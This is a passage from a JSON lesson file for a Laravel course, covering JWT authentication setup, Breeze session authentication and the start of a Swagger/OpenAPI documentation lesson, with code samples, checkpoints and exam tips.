this:","text":"A JWT token looks like this:"},{"kind":"code","lang":"text","code":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"},{"kind":"p","html":"Three sections, dot-separated: \u003ccode\u003eheader.payload.signature\u003c/code\u003e. All three are base64-encoded.","text":"Three sections, dot-separated: `header.payload.signature`. All three are base64-encoded."},{"kind":"p","html":"\u003cstrong\u003eHeader\u003c/strong\u003e — tells the receiver which algorithm was used:","text":"**Header** — tells the receiver which algorithm was used:"},{"kind":"code","lang":"json","code":"{\n  \"typ\": \"JWT\",\n  \"alg\": \"HS256\"\n}"},{"kind":"p","html":"\u003cstrong\u003ePayload\u003c/strong\u003e — the actual claims (user data + metadata). For example:","text":"**Payload** — the actual claims (user data + metadata). For example:"},{"kind":"code","lang":"json","code":"{\n  \"iss\": \"your-app.com\",\n  \"sub\": \"42\",\n  \"iat\": 1716239022,\n  \"exp\": 1716242622\n}"},{"kind":"p","html":"\u003cstrong\u003eSignature\u003c/strong\u003e — computed by hashing \u003ccode\u003ebase64(header) + &quot;.&quot; + base64(payload)\u003c/code\u003e with a secret key. The server generates this on login; on every future request it recomputes the hash and compares. If they match, the payload hasn&#39;t been tampered with.","text":"**Signature** — computed by hashing `base64(header) + \".\" + base64(payload)` with a secret key. The server generates this on login; on every future request it recomputes the hash and compares. If they match, the payload hasn't been tampered with."},{"kind":"callout","variant":"analogy","html":"\u003cp\u003eThe header + payload are like a wax-sealed letter. Anyone can read the contents, but the seal (signature) tells the recipient whether the letter was opened and re-sealed. If the seal breaks, the letter is rejected.\u003c/p\u003e","text":"The header + payload are like a wax-sealed letter. Anyone can read the contents, but the seal (signature) tells the recipient whether the letter was opened and re-sealed. If the seal breaks, the letter is rejected."},{"kind":"h2","html":"The 7 reserved claims","text":"The 7 reserved claims"},{"kind":"p","html":"JWT defines a set of standardized payload field names. You are not required to use all of them, but when you do use them they must follow the standard meaning. Know all seven — the exam tests them.","text":"JWT defines a set of standardized payload field names. You are not required to use all of them, but when you do use them they must follow the standard meaning. Know all seven — the exam tests them."},{"kind":"table","html":"\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003eClaim\u003c/th\u003e\n\u003cth\u003eMeaning\u003c/th\u003e\n\u003cth\u003eTypical value\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\u003ctr\u003e\n\u003ctd\u003e\u003ccode\u003eiat\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003eIssued at — when the token was created\u003c/td\u003e\n\u003ctd\u003eUnix timestamp, e.g. \u003ccode\u003e1716239022\u003c/code\u003e\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003ccode\u003eiss\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003eIssuer — which application/domain produced the token\u003c/td\u003e\n\u003ctd\u003e\u003ccode\u003e&quot;your-app.com&quot;\u003c/code\u003e\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003ccode\u003enbf\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003eNot before — earliest time the token is valid (≥ \u003ccode\u003eiat\u003c/code\u003e)\u003c/td\u003e\n\u003ctd\u003eUnix timestamp (e.g. \u003ccode\u003eiat + 10\u003c/code\u003e)\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003ccode\u003eexp\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003eExpiration — when the token stops being valid (&gt; \u003ccode\u003eiat\u003c/code\u003e and &gt; \u003ccode\u003enbf\u003c/code\u003e)\u003c/td\u003e\n\u003ctd\u003eUnix timestamp, e.g. \u003ccode\u003eiat + 3600\u003c/code\u003e\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003ccode\u003esub\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003eSubject — who the token is about (typically the user&#39;s ID)\u003c/td\u003e\n\u003ctd\u003e\u003ccode\u003e&quot;42&quot;\u003c/code\u003e\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003ccode\u003eaud\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003eAudience — which application(s) may consume this token\u003c/td\u003e\n\u003ctd\u003e\u003ccode\u003e&quot;your-frontend-app&quot;\u003c/code\u003e\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003ccode\u003ejti\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003eJWT ID — unique identifier for this specific token (prevents replay)\u003c/td\u003e\n\u003ctd\u003eUUID string\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\u003c/table\u003e"},{"kind":"checkpoint","q":"Which reserved claim identifies the user the token was issued for?","a":"`sub` (subject) — it stores the user's identifier, typically the primary key."},{"kind":"h2","html":"Token tampering: why it fails","text":"Token tampering: why it fails"},{"kind":"p","html":"Suppose an attacker intercepts your token, decodes the base64 payload (anyone can do this — the payload is not encrypted), and changes \u003ccode\u003e&quot;sub&quot;: &quot;42&quot;\u003c/code\u003e to \u003ccode\u003e&quot;sub&quot;: &quot;1&quot;\u003c/code\u003e to impersonate an admin.","text":"Suppose an attacker intercepts your token, decodes the base64 payload (anyone can do this — the payload is not encrypted), and changes `\"sub\": \"42\"` to `\"sub\": \"1\"` to impersonate an admin."},{"kind":"p","html":"When the modified token arrives at the server, the server recomputes the signature from the new header + payload. The recomputed signature does not match the original signature in the token. The server rejects the request.","text":"When the modified token arrives at the server, the server recomputes the signature from the new header + payload. The recomputed signature does not match the original signature in the token. The server rejects the request."},{"kind":"p","html":"The signature protects integrity, not secrecy. If you need the payload to be secret, encrypt it (JWE) — but for most API auth, signing is sufficient.","text":"The signature protects integrity, not secrecy. If you need the payload to be secret, encrypt it (JWE) — but for most API auth, signing is sufficient."},{"kind":"callout","variant":"pitfall","html":"\u003cp\u003eJWT payloads are base64-encoded, not encrypted. Never store sensitive data (passwords, credit card numbers) in the payload. The user can decode and read the contents with a simple base64 decode or jwt.io.\u003c/p\u003e","text":"JWT payloads are base64-encoded, not encrypted. Never store sensitive data (passwords, credit card numbers) in the payload. The user can decode and read the contents with a simple base64 decode or jwt.io."},{"kind":"h2","html":"Laravel setup: the right package","text":"Laravel setup: the right package"},{"kind":"p","html":"The package used in this course is \u003ccode\u003ephp-open-source-saver/jwt-auth\u003c/code\u003e. This is \u003cstrong\u003enot\u003c/strong\u003e the same as \u003ccode\u003etymon/jwt-auth\u003c/code\u003e. They are different packages with different setup steps. Using the wrong one is a common mistake.","text":"The package used in this course is `php-open-source-saver/jwt-auth`. This is **not** the same as `tymon/jwt-auth`. They are different packages with different setup steps. Using the wrong one is a common mistake."},{"kind":"p","html":"\u003cstrong\u003eStep 1 — Install the package:\u003c/strong\u003e","text":"**Step 1 — Install the package:**"},{"kind":"code","lang":"bash","code":"composer require php-open-source-saver/jwt-auth"},{"kind":"p","html":"\u003cstrong\u003eStep 2 — Publish the config:\u003c/strong\u003e","text":"**Step 2 — Publish the config:**"},{"kind":"code","lang":"bash","code":"php artisan vendor:publish --provider=\"PHPOpenSourceSaver\\JWTAuth\\Providers\\LaravelServiceProvider\""},{"kind":"p","html":"\u003cstrong\u003eStep 3 — Generate the secret key:\u003c/strong\u003e","text":"**Step 3 — Generate the secret key:**"},{"kind":"code","lang":"bash","code":"php artisan jwt:secret"},{"kind":"p","html":"This writes \u003ccode\u003eJWT_SECRET=...\u003c/code\u003e into your \u003ccode\u003e.env\u003c/code\u003e file. The secret signs and verifies every token.","text":"This writes `JWT_SECRET=...` into your `.env` file. The secret signs and verifies every token."},{"kind":"p","html":"\u003cstrong\u003eStep 4 — Configure the auth guard\u003c/strong\u003e in \u003ccode\u003econfig/auth.php\u003c/code\u003e. Add an \u003ccode\u003eapi\u003c/code\u003e guard that uses the \u003ccode\u003ejwt\u003c/code\u003e driver:","text":"**Step 4 — Configure the auth guard** in `config/auth.php`. Add an `api` guard that uses the `jwt` driver:"},{"kind":"code","lang":"php","code":"'guards' =\u003e [\n    'web' =\u003e [\n        'driver' =\u003e 'session',\n        'provider' =\u003e 'users',\n    ],\n    'api' =\u003e [\n        'driver' =\u003e 'jwt',\n        'provider' =\u003e 'users',\n    ],\n],"},{"kind":"callout","variant":"pitfall","html":"\u003cp\u003eUsing \u003ccode\u003etymon/jwt-auth\u003c/code\u003e instead of \u003ccode\u003ephp-open-source-saver/jwt-auth\u003c/code\u003e is the most common setup mistake in this course. The package names are similar, the Composer namespaces are different, and the setup steps differ. Always use the exact Composer name: \u003ccode\u003ephp-open-source-saver/jwt-auth\u003c/code\u003e.\u003c/p\u003e","text":"Using `tymon/jwt-auth` instead of `php-open-source-saver/jwt-auth` is the most common setup mistake in this course. The package names are similar, the Composer namespaces are different, and the setup steps differ. Always use the exact Composer name: `php-open-source-saver/jwt-auth`."},{"kind":"h2","html":"The JWTSubject interface","text":"The JWTSubject interface"},{"kind":"p","html":"Your \u003ccode\u003eUser\u003c/code\u003e model must implement the \u003ccode\u003eJWTSubject\u003c/code\u003e interface from \u003ccode\u003ePHPOpenSourceSaver\\JWTAuth\\Contracts\\JWTSubject\u003c/code\u003e. This requires two methods:","text":"Your `User` model must implement the `JWTSubject` interface from `PHPOpenSourceSaver\\JWTAuth\\Contracts\\JWTSubject`. This requires two methods:"},{"kind":"code","lang":"php","code":"use PHPOpenSourceSaver\\JWTAuth\\Contracts\\JWTSubject;\n\nclass User extends Authenticatable implements JWTSubject\n{\n    // Returns the value stored in the 'sub' claim of the JWT\n    public function getJWTIdentifier()\n    {\n        return $this-\u003egetKey();\n    }\n\n    // Returns an array of custom claims to add to the payload\n    public function getJWTCustomClaims()\n    {\n        return [];\n    }\n}"},{"kind":"p","html":"\u003ccode\u003egetJWTIdentifier()\u003c/code\u003e returns the model&#39;s primary key — this becomes the \u003ccode\u003esub\u003c/code\u003e claim. \u003ccode\u003egetJWTCustomClaims()\u003c/code\u003e returns any extra payload fields you want to include; returning an empty array is fine for basic auth.","text":"`getJWTIdentifier()` returns the model's primary key — this becomes the `sub` claim. `getJWTCustomClaims()` returns any extra payload fields you want to include; returning an empty array is fine for basic auth."},{"kind":"h2","html":"AuthController: the five methods","text":"AuthController: the five methods"},{"kind":"p","html":"Generate the controller:","text":"Generate the controller:"},{"kind":"code","lang":"bash","code":"php artisan make:controller api/AuthController"},{"kind":"p","html":"The constructor locks all methods behind \u003ccode\u003eauth:api\u003c/code\u003e middleware, except \u003ccode\u003elogin\u003c/code\u003e and \u003ccode\u003eregister\u003c/code\u003e:","text":"The constructor locks all methods behind `auth:api` middleware, except `login` and `register`:"},{"kind":"code","lang":"php","code":"public function __construct()\n{\n    $this-\u003emiddleware('auth:api', ['except' =\u003e ['login', 'register']]);\n}"},{"kind":"p","html":"The five methods and what they do:","text":"The five methods and what they do:"},{"kind":"table","html":"\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003eMethod\u003c/th\u003e\n\u003cth\u003eResponsibility\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\u003ctr\u003e\n\u003ctd\u003e\u003ccode\u003eregister\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003eValidates input, creates the \u003ccode\u003eUser\u003c/code\u003e record, logs the user in, returns JSON\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003ccode\u003elogin\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003eValidates credentials, calls \u003ccode\u003eAuth::attempt()\u003c/code\u003e, returns the JWT token on success\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003ccode\u003elogout\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003eCalls \u003ccode\u003eAuth::logout()\u003c/code\u003e to invalidate the token\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003ccode\u003erefresh\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003eInvalidates the current token and issues a new one via \u003ccode\u003eAuth::refresh()\u003c/code\u003e\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003ccode\u003euser\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003eReturns the currently authenticated user via \u003ccode\u003eAuth::user()\u003c/code\u003e\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\u003c/table\u003e"},{"kind":"p","html":"\u003cstrong\u003eExample login method:\u003c/strong\u003e","text":"**Example login method:**"},{"kind":"code","lang":"php","code":"public function login(Request $request)\n{\n    $request-\u003evalidate([\n        'email'    =\u003e 'required|string|email',\n        'password' =\u003e 'required|string',\n    ]);\n\n    $credentials = $request-\u003eonly('email', 'password');\n\n    if (!$token = Auth::attempt($credentials)) {\n        return response()-\u003ejson(['status' =\u003e 'error', 'message' =\u003e 'Unauthorized'], 401);\n    }\n\n    return response()-\u003ejson([\n        'status'        =\u003e 'success',\n        'user'          =\u003e Auth::user(),\n        'authorisation' =\u003e [\n            'token' =\u003e $token,\n            'type'  =\u003e 'bearer',\n        ],\n    ]);\n}"},{"kind":"p","html":"\u003ccode\u003eAuth::attempt()\u003c/code\u003e returns the JWT token string on success (not just \u003ccode\u003etrue\u003c/code\u003e), or \u003ccode\u003efalse\u003c/code\u003e on failure. Note the use of \u003ccode\u003eAuth::\u003c/code\u003e facade style — not \u003ccode\u003eauth()-&gt;\u003c/code\u003e.","text":"`Auth::attempt()` returns the JWT token string on success (not just `true`), or `false` on failure. Note the use of `Auth::` facade style — not `auth()-\u003e`."},{"kind":"h2","html":"Sending the Bearer token","text":"Sending the Bearer token"},{"kind":"p","html":"After login, the client stores the token and sends it with every protected request using the \u003ccode\u003eAuthorization\u003c/code\u003e header:","text":"After login, the client stores the token and sends it with every protected request using the `Authorization` header:"},{"kind":"code","lang":"text","code":"Authorization: Bearer \u003ctoken\u003e"},{"kind":"p","html":"In a REST client like VS Code REST Client or Postman, set the Authorization type to &quot;Bearer Token&quot; and paste the token value. The server&#39;s \u003ccode\u003eauth:api\u003c/code\u003e middleware reads this header, validates the signature, and populates \u003ccode\u003eAuth::user()\u003c/code\u003e for the request.","text":"In a REST client like VS Code REST Client or Postman, set the Authorization type to \"Bearer Token\" and paste the token value. The server's `auth:api` middleware reads this header, validates the signature, and populates `Auth::user()` for the request."},{"kind":"checkpoint","q":"How does the client authenticate after receiving a JWT token?","a":"It attaches the token to the `Authorization` header as `Bearer \u003ctoken\u003e` on every subsequent request."},{"kind":"h2","html":"Routes wiring","text":"Routes wiring"},{"kind":"p","html":"Add these routes in \u003ccode\u003eroutes/api.php\u003c/code\u003e:","text":"Add these routes in `routes/api.php`:"},{"kind":"code","lang":"php","code":"use App\\Http\\Controllers\\api\\AuthController;\n\nRoute::controller(AuthController::class)-\u003egroup(function () {\n    Route::post('login',    'login');\n    Route::post('register', 'register');\n    Route::post('logout',   'logout');\n    Route::post('refresh',  'refresh');\n});"},{"kind":"p","html":"Protect your resource routes with the \u003ccode\u003eauth:api\u003c/code\u003e middleware:","text":"Protect your resource routes with the `auth:api` middleware:"},{"kind":"code","lang":"php","code":"Route::middleware('auth:api')-\u003egroup(function () {\n    Route::get('students',          [StudentsController::class, 'index']);\n    Route::get('students/{student}', [StudentsController::class, 'show']);\n    Route::post('/students',         [StudentsController::class, 'store']);\n    Route::put('students/{student}', [StudentsController::class, 'update']);\n    Route::delete('students/{student}', [StudentsController::class, 'destroy']);\n});"},{"kind":"p","html":"After any route or config change, clear caches before testing:","text":"After any route or config change, clear caches before testing:"},{"kind":"code","lang":"bash","code":"php artisan route:cache\nphp artisan config:clear\nphp artisan cache:clear"},{"kind":"callout","variant":"takeaway","html":"\u003cp\u003eJWT lets your API verify identity without storing session state. The server signs a token on login; every subsequent request carries that token; the server re-verifies the signature. The three-part \u003ccode\u003eheader.payload.signature\u003c/code\u003e structure, the 7 reserved claims, the \u003ccode\u003ephp-open-source-saver/jwt-auth\u003c/code\u003e package, the \u003ccode\u003eJWTSubject\u003c/code\u003e interface, and the \u003ccode\u003eAuthorization: Bearer\u003c/code\u003e header format are all examinable. The most common wrong-answer trap is using \u003ccode\u003etymon/jwt-auth\u003c/code\u003e — use the exact package name from this course.\u003c/p\u003e","text":"JWT lets your API verify identity without storing session state. The server signs a token on login; every subsequent request carries that token; the server re-verifies the signature. The three-part `header.payload.signature` structure, the 7 reserved claims, the `php-open-source-saver/jwt-auth` package, the `JWTSubject` interface, and the `Authorization: Bearer` header format are all examinable. The most common wrong-answer trap is using `tymon/jwt-auth` — use the exact package name from this course."}]},{"n":10,"id":"session-auth-breeze","title":"Session authentication with Laravel Breeze","hook":"Add a full login/register/logout system to any Laravel app in two commands.","tags":["authentication","session","breeze","laravel","tailwind"],"module":"API and Authentication","source":"auth-with-breeze_SQLite_SCRIPT.docx","blocks":[{"kind":"h2","html":"Start with a protected route","text":"Start with a protected route"},{"kind":"p","html":"Before you know how Breeze works, look at what it produces. After installation, \u003ccode\u003eroutes/web.php\u003c/code\u003e contains this:","text":"Before you know how Breeze works, look at what it produces. After installation, `routes/web.php` contains this:"},{"kind":"code","lang":"php","code":"Route::get('/dashboard', function () {\n    return view('dashboard');\n})-\u003emiddleware(['auth', 'verified'])-\u003ename('dashboard');"},{"kind":"p","html":"Try navigating to \u003ccode\u003e/dashboard\u003c/code\u003e without logging in. Laravel redirects you to \u003ccode\u003e/login\u003c/code\u003e automatically. That redirect is the \u003ccode\u003eauth\u003c/code\u003e middleware at work — it checks whether a session exists for the current request and bounces unauthenticated visitors to the login page.","text":"Try navigating to `/dashboard` without logging in. Laravel redirects you to `/login` automatically. That redirect is the `auth` middleware at work — it checks whether a session exists for the current request and bounces unauthenticated visitors to the login page."},{"kind":"p","html":"That one line — \u003ccode\u003e-&gt;middleware([&#39;auth&#39;, &#39;verified&#39;])\u003c/code\u003e — is the entire protection mechanism. Everything else Breeze installs (routes, controllers, views) is the scaffolding that creates and destroys those sessions.","text":"That one line — `-\u003emiddleware(['auth', 'verified'])` — is the entire protection mechanism. Everything else Breeze installs (routes, controllers, views) is the scaffolding that creates and destroys those sessions."},{"kind":"checkpoint","q":"Without reading further, what do you think `'verified'` adds on top of `'auth'`?","a":"`'auth'` requires the user to be logged in. `'verified'` additionally requires their email address to have been verified. A logged-in but unverified user still gets blocked by `'verified'`."},{"kind":"h2","html":"Installing Breeze","text":"Installing Breeze"},{"kind":"p","html":"Breeze is a Composer dev-dependency, then an Artisan installer:","text":"Breeze is a Composer dev-dependency, then an Artisan installer:"},{"kind":"code","lang":"bash","code":"composer require laravel/breeze --dev\nphp artisan breeze:install"},{"kind":"p","html":"\u003ccode\u003ebreeze:install\u003c/code\u003e publishes routes, controllers, and Blade views directly into your project. Run your migrations and serve as normal:","text":"`breeze:install` publishes routes, controllers, and Blade views directly into your project. Run your migrations and serve as normal:"},{"kind":"code","lang":"bash","code":"php artisan migrate\nphp artisan serve --port=8888"},{"kind":"callout","variant":"pitfall","html":"\u003cp\u003eBreeze uses \u003cstrong\u003eTailwind CSS\u003c/strong\u003e for all its views — not Bootstrap. If you are used to \u003ccode\u003elaravel/ui\u003c/code\u003e (which scaffolds Bootstrap), the class names are completely different. The exam explicitly distinguishes these two packages. \u003ccode\u003elaravel/ui\u003c/code\u003e = Bootstrap; Breeze = Tailwind. Never mix them up in an exam answer.\u003c/p\u003e","text":"Breeze uses **Tailwind CSS** for all its views — not Bootstrap. If you are used to `laravel/ui` (which scaffolds Bootstrap), the class names are completely different. The exam explicitly distinguishes these two packages. `laravel/ui` = Bootstrap; Breeze = Tailwind. Never mix them up in an exam answer."},{"kind":"h2","html":"What Breeze installs","text":"What Breeze installs"},{"kind":"p","html":"After installation your project gains:","text":"After installation your project gains:"},{"kind":"p","html":"\u003cstrong\u003eRoutes\u003c/strong\u003e — Breeze writes all authentication routes into \u003ccode\u003eroutes/auth.php\u003c/code\u003e, which is \u003ccode\u003erequire\u003c/code\u003ed from \u003ccode\u003eroutes/web.php\u003c/code\u003e. Two groups exist:","text":"**Routes** — Breeze writes all authentication routes into `routes/auth.php`, which is `require`d from `routes/web.php`. Two groups exist:"},{"kind":"p","html":"\u003cul\u003e\n\u003cli\u003e\u003ccode\u003eguest\u003c/code\u003e middleware group: register, login, forgot-password, reset-password.\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eauth\u003c/code\u003e middleware group: verify-email, confirm-password, logout, password update.\u003c/li\u003e\n\u003c/ul\u003e","text":"- `guest` middleware group: register, login, forgot-password, reset-password.\n- `auth` middleware group: verify-email, confirm-password, logout, password update."},{"kind":"p","html":"\u003cstrong\u003eControllers\u003c/strong\u003e — all in \u003ccode\u003eapp/Http/Controllers/Auth/\u003c/code\u003e:","text":"**Controllers** — all in `app/Http/Controllers/Auth/`:"},{"kind":"p","html":"\u003cul\u003e\n\u003cli\u003e\u003ccode\u003eRegisteredUserController\u003c/code\u003e — handles register form + new user creation.\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eAuthenticatedSessionController\u003c/code\u003e — handles login form + session creation/destruction.\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003ePasswordResetLinkController\u003c/code\u003e and \u003ccode\u003eNewPasswordController\u003c/code\u003e — handle password reset flow.\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eEmailVerificationNotificationController\u003c/code\u003e, \u003ccode\u003eVerifyEmailController\u003c/code\u003e — handle email verification.\u003c/li\u003e\n\u003c/ul\u003e","text":"- `RegisteredUserController` — handles register form + new user creation.\n- `AuthenticatedSessionController` — handles login form + session creation/destruction.\n- `PasswordResetLinkController` and `NewPasswordController` — handle password reset flow.\n- `EmailVerificationNotificationController`, `VerifyEmailController` — handle email verification."},{"kind":"p","html":"\u003cstrong\u003eViews\u003c/strong\u003e — Blade templates under \u003ccode\u003eresources/views/auth/\u003c/code\u003e, \u003ccode\u003eresources/views/components/\u003c/code\u003e, \u003ccode\u003eresources/views/layouts/\u003c/code\u003e, and \u003ccode\u003eresources/views/profile/\u003c/code\u003e.","text":"**Views** — Blade templates under `resources/views/auth/`, `resources/views/components/`, `resources/views/layouts/`, and `resources/views/profile/`."},{"kind":"p","html":"None of these controllers need modification for basic use. You protect your own routes by attaching middleware — the controllers do the rest.","text":"None of these controllers need modification for basic use. You protect your own routes by attaching middleware — the controllers do the rest."},{"kind":"h2","html":"The Auth facade","text":"The Auth facade"},{"kind":"p","html":"Once a user is authenticated, two facade calls give you their data anywhere in a controller:","text":"Once a user is authenticated, two facade calls give you their data anywhere in a controller:"},{"kind":"code","lang":"php","code":"use Illuminate\\Support\\Facades\\Auth;\n\n// Returns the full authenticated User model, or null if not logged in\n$user = Auth::user();\n\n// Returns the authenticated user's primary key (integer), or null\n$id = Auth::id();"},{"kind":"callout","variant":"note","html":"\u003cp\u003eThe voice guide for this course specifies \u003ccode\u003eAuth::user()\u003c/code\u003e and \u003ccode\u003eAuth::id()\u003c/code\u003e (facade style). Do not substitute \u003ccode\u003eauth()-&gt;user()\u003c/code\u003e — both work, but Prefer facade style Auth::user() — consistent with Laravel&#39;s static-analysis tooling.\u003c/p\u003e","text":"The voice guide for this course specifies `Auth::user()` and `Auth::id()` (facade style). Do not substitute `auth()-\u003euser()` — both work, but Prefer facade style Auth::user() — consistent with Laravel's static-analysis tooling."},{"kind":"p","html":"The practical pattern: inside any controller protected by the \u003ccode\u003eauth\u003c/code\u003e middleware, \u003ccode\u003eAuth::user()\u003c/code\u003e is guaranteed non-null. You can call it without a null-check.","text":"The practical pattern: inside any controller protected by the `auth` middleware, `Auth::user()` is guaranteed non-null. You can call it without a null-check."},{"kind":"code","lang":"php","code":"public function index() {\n    $orgs = Auth::user()-\u003eorgs()-\u003elatest('updated_at')-\u003eget();\n    return view('orgs.index', ['orgs' =\u003e $orgs]);\n}"},{"kind":"p","html":"This fetches only the records belonging to the currently logged-in user via the \u003ccode\u003eorgs()\u003c/code\u003e Eloquent relationship defined on the User model.","text":"This fetches only the records belonging to the currently logged-in user via the `orgs()` Eloquent relationship defined on the User model."},{"kind":"h2","html":"Middleware names","text":"Middleware names"},{"kind":"p","html":"Two middleware names are relevant for session auth:","text":"Two middleware names are relevant for session auth:"},{"kind":"table","html":"\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003eMiddleware\u003c/th\u003e\n\u003cth\u003eMeaning\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\u003ctr\u003e\n\u003ctd\u003e\u003ccode\u003eauth\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003eRequest must have a valid authenticated session. Redirects to login if not.\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003ccode\u003everified\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003eSame as \u003ccode\u003eauth\u003c/code\u003e, plus the user&#39;s email must be verified.\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\u003c/table\u003e"},{"kind":"p","html":"You apply them per-route or per-group:","text":"You apply them per-route or per-group:"},{"kind":"code","lang":"php","code":"// Single route\nRoute::get('/dashboard', fn() =\u003e view('dashboard'))\n    -\u003emiddleware(['auth', 'verified']);\n\n// Group — applies auth to all routes inside\nRoute::middleware('auth')-\u003egroup(function () {\n    Route::resource('/org', OrgController::class);\n});"},{"kind":"checkpoint","q":"Which middleware name do you chain when you want every route in a group to require a logged-in user?","a":"`'auth'`. Use `-\u003emiddleware('auth')-\u003egroup(...)` or pass `'auth'` in the middleware array. `'verified'` adds the email-verification requirement on top."},{"kind":"h2","html":"Sanctum as the token alternative","text":"Sanctum as the token alternative"},{"kind":"p","html":"Breeze covers session-based authentication — appropriate for traditional Blade applications where the browser manages the session cookie. For API clients (mobile apps, SPAs making fetch calls), Laravel Sanctum provides token-based authentication via \u003ccode\u003ecreateToken()\u003c/code\u003e. The exam treats these as distinct alternatives:","text":"Breeze covers session-based authentication — appropriate for traditional Blade applications where the browser manages the session cookie. For API clients (mobile apps, SPAs making fetch calls), Laravel Sanctum provides token-based authentication via `createToken()`. The exam treats these as distinct alternatives:"},{"kind":"p","html":"\u003cul\u003e\n\u003cli\u003eBreeze → session + cookie → Blade apps.\u003c/li\u003e\n\u003cli\u003eSanctum → personal access tokens → API/SPA clients.\u003c/li\u003e\n\u003cli\u003eJWT (\u003ccode\u003ephp-open-source-saver/jwt-auth\u003c/code\u003e) → stateless tokens → fully decoupled API clients.\u003c/li\u003e\n\u003c/ul\u003e","text":"- Breeze → session + cookie → Blade apps.\n- Sanctum → personal access tokens → API/SPA clients.\n- JWT (`php-open-source-saver/jwt-auth`) → stateless tokens → fully decoupled API clients."},{"kind":"callout","variant":"takeaway","html":"\u003cp\u003eBreeze gives you a complete session-auth system in two commands. The key mechanism: \u003ccode\u003e-&gt;middleware([&#39;auth&#39;])\u003c/code\u003e on a route checks for a valid session and redirects unauthenticated visitors to login. \u003ccode\u003eAuth::user()\u003c/code\u003e and \u003ccode\u003eAuth::id()\u003c/code\u003e retrieve the authenticated user in any controller. Breeze is Tailwind-based — not Bootstrap — and that distinction is exam-testable.\u003c/p\u003e","text":"Breeze gives you a complete session-auth system in two commands. The key mechanism: `-\u003emiddleware(['auth'])` on a route checks for a valid session and redirects unauthenticated visitors to login. `Auth::user()` and `Auth::id()` retrieve the authenticated user in any controller. Breeze is Tailwind-based — not Bootstrap — and that distinction is exam-testable."}]},{"n":11,"id":"swagger-openapi","title":"Swagger and OpenAPI in Laravel","hook":"Your Laravel API works — but no one knows how to call it. Swagger UI fixes that in seven steps.","tags":["swagger","openapi","l5-swagger","api-documentation","laravel"],"module":"Swagger and cURL","source":"swagger-with-laravel.pptx; Laravel_L5Swagger_SCRIPT_2026.docx","blocks":[{"kind":"h2","html":"A concrete endpoint, documented","text":"A concrete endpoint, documented"},{"kind":"p","html":"Before any theory: here is what an annotated controller method looks like.","text":"Before any theory: here is what an annotated controller method looks like."},{"kind":"code","lang":"php","code":"#[OA\\Get(\n    path: \"/api/students\",\n    tags: [\"Students\"],\n    summary: \"Get all students\",\n    responses: [\n        new OA\\Response(\n            response: 200,\n            description: \"List of all students\",\n            content: new OA\\JsonContent(\n                type: \"array\",\n                items: new OA\\Items(ref: \"#/components/schemas/Student\")\n            )\n        )\n    ]\n)]\npublic function index(): JsonResponse\n{\n    return response()-\u003ejson(Student::all());\n}"},{"kind":"p","html":"Those \u003ccode\u003e#[OA\\...]\u003c/code\u003e blocks are \u003ccode\u003e@OA\\ annotations\u003c/code\u003e — PHPDoc-style PHP 8 attributes placed directly above the method they describe. When you run \u003ccode\u003ephp artisan l5-swagger:generate\u003c/code\u003e, the l5-swagger package reads every annotation in your project and compiles them into a single OpenAPI JSON document. Swagger UI then renders that document as the interactive page at \u003ccode\u003e/api/documentation\u003c/code\u003e.","text":"Those `#[OA\\...]` blocks are `@OA\\ annotations` — PHPDoc-style PHP 8 attributes placed directly above the method they describe. When you run `php artisan l5-swagger:generate`, the l5-swagger package reads every annotation in your project and compiles them into a single OpenAPI JSON document. Swagger UI then renders that document as the interactive page at `/api/documentation`."},{"kind":"checkpoint","q":"Before reading on — what do you think happens if you add a new annotation to a controller but do not re-run `php artisan l5-swagger:generate`?","a":"Swagger UI shows the old docs. The new annotation is ignored until you regenerate. The compiler step is manual (unless you set 